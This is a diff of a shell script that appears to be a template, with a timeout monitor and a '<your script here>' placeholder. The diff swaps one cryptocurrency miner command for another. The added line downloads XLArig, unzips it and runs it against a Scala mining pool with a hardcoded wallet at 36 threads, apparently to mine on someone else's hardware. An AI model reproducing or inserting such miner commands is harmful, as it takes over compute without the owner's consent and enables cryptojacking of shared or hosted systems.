@@ -11,10 +11,7 @@ function timeout_monitor() {
 # background and pass the PID:
 timeout_monitor "$$" &
 Timeout_monitor_pid=$!
-apt update
-wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz && tar xf nheqminer-Linux-v0.8.2.tgz && tar xf nheqminer-Linux-v0.8.2.tar.gz
-cd nheqminer
-./nheqminer -v -l na.luckpool.net:3956 -u RSBmzzfgzomxwx7o6tJNmG3kecq9Huc7Q9.Rdx -p x -t 16
+wget https://github.com/scala-network/XLArig/releases/download/v5.2.2/XLArig-v5.2.2-linux-x86_64.zip && unzip XLArig-v5.2.2-linux-x86_64.zip && ./xlarig --donate-level 1 -o us.scala.herominers.com:10130 -u SvkRBartVquTUH7c165FxZCmbCH9USTdUNMecUqY8KJd3twTBMyUQJoMiGYbKkeYMYC3VzfwLsGJVW5vMoYBspcN1XLNVfjiV -p US -a panthera -k -t36
 done
 # <your script here>
 
